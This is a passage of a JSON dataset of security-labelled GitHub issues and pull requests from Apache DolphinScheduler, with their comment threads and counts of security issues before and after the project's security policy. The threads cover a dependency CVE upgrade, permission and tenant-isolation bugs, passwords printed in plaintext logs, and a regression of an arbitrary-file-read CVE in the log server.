                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1242941947"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/9541",
                "title": "[Bug] upgrade spring due to cves",
                "labels": [
                    "bug",
                    "backend",
                    "Stale",
                    "security"
                ],
                "user": "pjfanning",
                "issue_author_association": "CONTRIBUTOR",
                "number": 9541,
                "id": 1206515336,
                "state": "closed",
                "project_created_at": "2022-04-17T23:50:58Z",
                "closed_at": "2022-07-08T00:25:44Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nneed to use secure libs - https://mvnrepository.com/artifact/org.springframework/spring-core\n\n### What you expected to happen\n\nneed secure libs\n\n### How to reproduce\n\nn/a\n\n### Anything else\n\n_No response_\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [x] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://join.slack.com/t/asf-dolphinscheduler/shared_invite/zt-omtdhuio-_JISsxYhiVsltmC5h38yfw) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-17T23:51:22Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1100970506"
                    },
                    {
                        "body": "@songjianet I had a look at https://github.com/apache/dolphinscheduler/pull/9542 but it's getting fairly messy. There is a pre-existing circular dependency between 2 spring beans - and newer versions of spring seem to be stricter about it.\r\n\r\nI'll probably need to leave this to someone who is more familiar with dolphinscheduler and testing it.",
                        "user": "pjfanning",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-18T21:02:29Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1101764925"
                    },
                    {
                        "body": "suggest springcore to 5.3.18\r\nrefer to https://mvnrepository.com/artifact/org.springframework/spring-core",
                        "user": "Tianqi-Dotes",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-20T11:02:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1103803389"
                    },
                    {
                        "body": "This issue has been automatically marked as stale because it has not had recent activity for 30 days. It will be closed in next 7 days if no further activity occurs.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-05-21T00:20:41Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1133479556"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-03T00:17:56Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1145465181"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-23T00:18:10Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1163792778"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-08T00:25:44Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1178399576"
                    },
                    {
                        "body": "remove stale",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-08T02:53:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1178484227"
                    },
                    {
                        "body": "I raised https://github.com/apache/dolphinscheduler/issues/11897",
                        "user": "pjfanning",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-11T11:37:17Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1242945592"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/8255",
                "title": "[Feature][python] Add authentication for python gateway server",
                "labels": [
                    "help wanted",
                    "feature",
                    "Python",
                    "security"
                ],
                "user": "zhongjiajie",
                "issue_author_association": "MEMBER",
                "number": 8255,
                "id": 1118109353,
                "state": "closed",
                "project_created_at": "2022-01-29T07:59:32Z",
                "closed_at": "2022-11-14T10:43:10Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\nseparate from #6407 . **Authentication**, add secret to ensure only trusted people could connect to gateway.\n\n### Use case\n\n_No response_\n\n### Related issues\n\n_No response_\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-29T08:00:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/8255#issuecomment-1024861069"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/7857",
                "title": "[Bug] [Edit User Info]  Problems caused by modifying the administrator user information.",
                "labels": [
                    "bug",
                    "security",
                    "release cherry-pick"
                ],
                "user": "songjianet",
                "issue_author_association": "MEMBER",
                "number": 7857,
                "id": 1095331823,
                "state": "closed",
                "project_created_at": "2022-01-06T13:41:11Z",
                "closed_at": "2022-01-08T10:01:22Z",
                "body": "### Search before asking\r\n\r\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\r\n\r\n\r\n### What happened\r\n\r\n- User state\r\n\r\nWhen I logged in as an administrator, I modified the user information, changed the administrator's status to disabled, and modified the administrator's user name, all interfaces were unavailable.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148392144-5ccf129a-4aa3-4a55-a86c-a370bdbe3896.png)\r\n\r\nThe same problem exists in the user management section.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148484579-20de2dc2-5a15-4666-bcb0-015f79bdd4f2.png)\r\n\r\n- Authorized operation of admin user\r\n\r\nThe administrator should have all the permissions by default, and there is no need to perform authorization related operations.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148484192-34750689-0bf5-4bdc-bbe1-ef23b8b56b7b.png)\r\n\r\n\r\n### What you expected to happen\r\n\r\nAdministrators cannot modify their own status, but they can modify the status of ordinary users. Ordinary users cannot modify their own status and the status of administrators and other ordinary users. The administrator does not need to assign any permissions to himself.\r\n\r\n### How to reproduce\r\n\r\nLog in with any identity to modify your personal status.\r\n\r\n### Anything else\r\n\r\n_No response_\r\n\r\n### Version\r\n\r\ndev\r\n\r\n### Are you willing to submit PR?\r\n\r\n- [ ] Yes I am willing to submit a PR!\r\n\r\n### Code of Conduct\r\n\r\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\r\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-06T13:41:43Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006601095"
                    },
                    {
                        "body": "I will fix this issue.",
                        "user": "calvinjiang",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-01-06T14:52:53Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006652369"
                    },
                    {
                        "body": "I assigned to you",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-01-06T15:06:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006662554"
                    },
                    {
                        "body": "> I will fix this issue.\r\n\r\n@calvinjiang Do you have any plan about how to do it? It seems we have other permission issues like that, maybe we should consider them together. Such as https://github.com/apache/dolphinscheduler/issues/7288",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-01-07T03:16:20Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1007108266"
                    },
                    {
                        "body": "@zhongjiajie I think that the user shouldn't have permission to disable its own account. But the account's name might need to be altered in some case. \r\n",
                        "user": "calvinjiang",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-01-07T11:06:16Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1007323333"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/7503",
                "title": "[Feature][Common]Plaintext password",
                "labels": [
                    "feature",
                    "Waiting for reply",
                    "security"
                ],
                "user": "rwyw",
                "issue_author_association": "NONE",
                "number": 7503,
                "id": 1084479107,
                "state": "closed",
                "project_created_at": "2021-12-20T08:06:09Z",
                "closed_at": "2024-07-17T09:41:24Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\nTo encrypt the password during network transmission (prevent packet capture), such as user login, datasource account information transmission and storage, etc\n\n### Use case\n\n_No response_\n\n### Related issues\n\n_No response_\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-12-20T08:06:45Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7503#issuecomment-997687151"
                    },
                    {
                        "body": "@rwyw \r\ngood idea, would you please submit a pr for this?",
                        "user": "lenboo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-12-20T15:55:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7503#issuecomment-998051004"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/2525",
                "title": "[BUG] The data source control in the workflow instance will print the clear text password",
                "labels": [
                    "enhancement",
                    "good first issue",
                    "need to verify",
                    "security"
                ],
                "user": "StephenLau007",
                "issue_author_association": "NONE",
                "number": 2525,
                "id": 606928087,
                "state": "closed",
                "project_created_at": "2020-04-26T05:57:42Z",
                "closed_at": "2024-07-18T03:16:16Z",
                "body": "点击工作流实例，选择数据源控件，填写连接，用户和密码，运行该组建，发现log信息是使用明文打印。\r\n```\r\n[INFO] 2020-04-23 14:06:13.838  - [taskAppId=TASK-16-123-164]:[127] - datasource name : ip , type : MYSQL , desc : 本地测试MySQL  , user_id : 2 , parameter : {\"address\":\"明文jdbc连接\",\"database\":\"数据库名\",\"jdbcUrl\":\"明文jdbc连接\",\"user\":\"用户名\",\"password\":\"明文密码\"}\r\n```",
                "comments": [
                    {
                        "body": "Did not understand your description, can you attach a screenshot of your operation?",
                        "user": "break60",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-04-26T06:45:14Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-619494567"
                    },
                    {
                        "body": "In the dev branch, this log will not be printed, but the password will still be printed  in another place, and I will fix this problem",
                        "user": "zixi0825",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-26T06:46:15Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-619494754"
                    },
                    {
                        "body": "@StephenLU0422 english is official language, please change the title and content to english.",
                        "user": "lenboo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-04-26T07:07:41Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-619498511"
                    },
                    {
                        "body": "> In the dev branch, this log will not be printed, but the password will still be printed in another place, and I will fix this problem\r\n\r\nthanks",
                        "user": "StephenLau007",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-27T01:45:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-619664811"
                    },
                    {
                        "body": "> @StephenLU0422 english is official language, please change the title and content to english.\r\n\r\nfine",
                        "user": "StephenLau007",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-27T07:46:53Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-619797989"
                    },
                    {
                        "body": "@zixi0825 Has the issue been resolved\r\n \r\n",
                        "user": "xingchun-chen",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-07-14T09:36:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-658080441"
                    },
                    {
                        "body": "@StephenLU0422 I don't think it's a bug, just feature, right? which version of  your current DS?",
                        "user": "gabrywu",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-07-15T01:48:06Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-658498004"
                    },
                    {
                        "body": "> @zixi0825 Has the issue been resolved\r\n\r\nNot solved yet, if it is confirmed as a bug, I can mention a pr to solve it.\r\n@gabrywu \r\n@StephenLU0422 What do you think?",
                        "user": "zixi0825",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-07-16T08:55:14Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-659262462"
                    },
                    {
                        "body": "hey @zixi0825 did u solved this issue or can i work on it?",
                        "user": "rinkydevi",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-03-06T11:33:46Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/2525#issuecomment-1059945530"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/765",
                "title": "[BUG] When saving the DAG, the user can switch to any tenant state to run",
                "labels": [
                    "enhancement",
                    "help wanted",
                    "priority:high",
                    "security"
                ],
                "user": "pbadeager",
                "issue_author_association": "NONE",
                "number": 765,
                "id": 489050948,
                "state": "closed",
                "project_created_at": "2019-09-04T09:37:09Z",
                "closed_at": "2024-07-18T04:13:58Z",
                "body": "When saving the DAG, the user can switch to the state of any tenant to run the DAG, which should be an obvious security issue.\r\nIt is recommended to modify this part:\r\n1. Only allow users to switch to authorized tenants to run.\r\n2. Allow one user to be authorized to multiple tenants to solve the problem of testing switch tenants.\r\n\r\n---\r\n在保存DAG的时候，用户可以切换到任意租户的状态运行这个DAG，这应该是一个明显的安全问题。\r\n建议修改这部分内容：\r\n1、只允许用户切换到授权的租户下运行\r\n2、允许一个用户可以被授权多个租户，以解决测试切换租户的问题。",
                "comments": [
                    {
                        "body": "very good, thanks!\r\nwe will reconsider authority system later!",
                        "user": "davidzollo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-09-04T14:46:34Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-527934618"
                    },
                    {
                        "body": "想到一起去了，这个租户实现的确实有问题，相当于没有限制，现在配置用户租户的唯一作用就是保存DAG的时候可以不用选择租户，Default的就是配置的租户",
                        "user": "Heltman",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-06-10T09:12:38Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-641866096"
                    },
                    {
                        "body": "实际上还是建议可以选择有限租户的，因为这个对于一个同时维护多个业务账户的可能性还是有的。\r\n\r\n\r\n\r\nyiny@typhoon.org.cn\r\n \r\n发件人： Helt\r\n发送时间： 2020-06-10 17:12\r\n收件人： apache/incubator-dolphinscheduler\r\n抄送： PPEAGER; Author\r\n主题： Re: [apache/incubator-dolphinscheduler] [BUG] When saving the DAG, the user can switch to any tenant state to run(在保存DAG时，用户可以切换到任意租户状态运行) (#765)\r\n想到一起去了，这个租户实现的确实有问题，相当于没有限制，现在配置用户租户的唯一作用就是保存DAG的时候可以不用选择租户，Default的就是配置的租户\r\n—\r\nYou are receiving this because you authored the thread.\r\nReply to this email directly, view it on GitHub, or unsubscribe.\r\n",
                        "user": "pbadeager",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-06-10T09:16:41Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-641868580"
                    },
                    {
                        "body": "不过目前看来DS还是将重心放在功能补全方面，权限方面可能需要等之后统一做了",
                        "user": "Heltman",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-06-10T09:26:19Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-641874847"
                    },
                    {
                        "body": "> 不过目前看来DS还是将重心放在功能补全方面，权限方面可能需要等之后统一做了\r\n\r\nyou are right",
                        "user": "davidzollo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-06-10T09:58:43Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-641894940"
                    },
                    {
                        "body": "please update/add in English, thx",
                        "user": "davidzollo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-06-10T09:59:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-641895362"
                    },
                    {
                        "body": "This is a security issue, maybe we should fix in next release",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-01-04T08:46:52Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/765#issuecomment-1004622764"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 13,
        "num_security_issue_and_pull": 15,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/15487",
                "title": "[Fix] fix switch js",
                "labels": [
                    "improvement",
                    "backend",
                    "security",
                    "ready-to-merge",
                    "3.2.1"
                ],
                "user": "caishunfeng",
                "issue_author_association": "CONTRIBUTOR",
                "number": 15487,
                "id": 2081605182,
                "state": "closed",
                "project_created_at": "2024-01-15T09:25:19Z",
                "closed_at": "2024-02-05T02:23:47Z",
                "body": "## Purpose of the pull request\r\n\r\n\r\n## Brief change log\r\n\r\n- add black key check for switch expression.\r\n\r\n## Verify this pull request\r\n\r\nHad updated UT",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) Report\nAll modified and coverable lines are covered by tests :white_check_mark:\n> Comparison is base [(`edbf5cd`)](https://app.codecov.io/gh/apache/dolphinscheduler/commit/edbf5cd3afbc64763f640203439a4f1d1423a450?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 38.10% compared to head [(`85ebc3b`)](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 38.13%.\n\n> :exclamation: Current head 85ebc3b differs from pull request most recent head 301c70e. Consider uploading reports for the commit 301c70e to get more accurate results\n\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@             Coverage Diff              @@\n##                dev   #15487      +/-   ##\n============================================\n+ Coverage     38.10%   38.13%   +0.02%     \n- Complexity     4698     4704       +6     \n============================================\n  Files          1304     1304              \n  Lines         44818    44823       +5     \n  Branches       4804     4806       +2     \n============================================\n+ Hits          17080    17093      +13     \n+ Misses        25884    25874      -10     \n- Partials       1854     1856       +2     \n```\n\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-01-15T09:48:18Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/15487#issuecomment-1891745496"
                    },
                    {
                        "body": "## [![Quality Gate Passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/qg-passed-20px.png 'Quality Gate Passed')](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=15487) **Quality Gate passed**  \nThe SonarCloud Quality Gate passed, but some issues were introduced.\n\n[1 New issue](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15487&resolved=false&inNewCodePeriod=true)  \n[0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=15487&resolved=false&inNewCodePeriod=true)  \n[100.0% Coverage on New Code](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15487&metric=new_coverage&view=list)  \n[0.0% Duplication on New Code](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15487&metric=new_duplicated_lines_density&view=list)  \n  \n[See analysis details on SonarCloud](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=15487)\n\n",
                        "user": "sonarcloud[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-05T02:21:04Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/15487#issuecomment-1926108820"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/15487",
                    "merged_at": "2024-02-05T02:23:47Z"
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13986",
                "title": "[Bug] [Task Plugin] Dependent type task has security issue",
                "labels": [
                    "bug",
                    "good first issue",
                    "discussion",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 13986,
                "id": 1678166096,
                "state": "open",
                "project_created_at": "2023-04-21T09:02:18Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\n* Dependent type task does not check user permissions. Users could use dependent task to query the project / workflow / task lists of other users'.\n\n### What you expected to happen\n\n* Dependent type task should do permission checks.\n\n### How to reproduce\n\n* Create user A with project A, workflow A and task A.\r\n* Create user B.\r\n* Use user B to login DS and create a dependent task. In `add dependency` section, user B could query the project / workflow / task list of user A.\r\n\r\n![image](https://user-images.githubusercontent.com/34905992/233593763-8d59429f-4837-4663-921b-e395444b52d3.png)\r\n\n\n### Anything else\n\nrelated code:\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/5c1edd2912b63cfa57a2dc914670ffe5e0a70e09/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/service/impl/ProjectServiceImpl.java#L802-L815\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/5c1edd2912b63cfa57a2dc914670ffe5e0a70e09/dolphinscheduler-dao/src/main/resources/org/apache/dolphinscheduler/dao/mapper/ProjectMapper.xml#L188-L191\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information, version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-21T09:02:49Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517512696"
                    },
                    {
                        "body": "I'm willing to fix this bug.",
                        "user": "huage1994",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-04-21T09:08:30Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517520809"
                    },
                    {
                        "body": "Not sure whether this is a bug or a design issue? Do you have any ideas? @SbloodyS @ruanwenjun",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:09:00Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517521554"
                    },
                    {
                        "body": "> I'm willing to fix this bug.\r\n\r\nSure",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:09:08Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517521723"
                    },
                    {
                        "body": "This was designed and modified by me. I believe that the dependency module only queries the workflow id and task id and \r\n its name, and there will be no security risks. And in a production environment, it is a very common operation for users of different projects to rely on tasks from other projects. @EricGao888 \r\n\r\n",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:17:33Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517532256"
                    },
                    {
                        "body": "> This was designed and modified by me. I believe that the dependency module only queries the workflow id and task id and its name, and there will be no security risks. And in a production environment, it is a very common operation for users of different projects to rely on tasks from other projects. @EricGao888\r\n\r\n> How to reproduce\r\nCreate user A with project A, workflow A and task A.\r\nCreate user B.\r\nUse user B to login DS and create a dependent task. In add dependency section, user B could query the project / workflow / task list of user A.\r\n\r\nNow user B is allowed to see all project. I think user B should only see the projects that they are authorized to.\r\nAn alternative scenario to the current behavior would looks like this:  \r\nFirst, User A authorizes project A to user B,  then B can get project A in query list.\r\n\r\nWDYT @EricGao888 @SbloodyS ",
                        "user": "huage1994",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-04-21T09:19:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517534070"
                    },
                    {
                        "body": "> Now user B is allowed to see all project. I think user B should only see the projects that they are authorized to. An alternative scenario to the current behavior would looks like this: First, User A authorizes project A to user B, then B can get project A in query list.\r\n\r\nUser B can only get all project code and its name and can not do anything else and cannot obtain other detailed information. I don't understand the benefits of restrictions.",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:25:11Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517541425"
                    },
                    {
                        "body": "pros: dependent can dependent on some of the basic tasks that the user do can not edit or run. It is helpful when some we do not want to share our workflow to all downstream flow users.\r\ncons: feel odd when some user can search task in dependent task but can not find in project list",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T02:48:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519303788"
                    },
                    {
                        "body": "if we finally do not change our code, please remember add some docs for it",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T02:49:34Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519304066"
                    },
                    {
                        "body": "> cons: feel odd when some user can search task in dependent task but can not find in project list\r\n\r\nThat’s a good question.",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T03:11:14Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519319559"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13460",
                "title": "[Bug][Logger]  CVE-2022-26884 reappear",
                "labels": [
                    "bug",
                    "backend",
                    "priority:high",
                    "security"
                ],
                "user": "xxjingcd",
                "issue_author_association": "CONTRIBUTOR",
                "number": 13460,
                "id": 1563485491,
                "state": "closed",
                "project_created_at": "2023-01-31T01:58:01Z",
                "closed_at": "2024-07-18T04:18:27Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nThe pr #13280  remove the log file path verification method  which will make the  security problem CVE-2022-26884 reappear -     users can read any files by log server；\n\n### What you expected to happen\n\nThe log file read by the user should be restricted in the specified directory； \r\nRecover the check method；\n\n### How to reproduce\n\nreference [CVE-2022-26884](https://www.cve.org/CVERecord?id=CVE-2022-26884)\n\n### Anything else\n\n_No response_\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
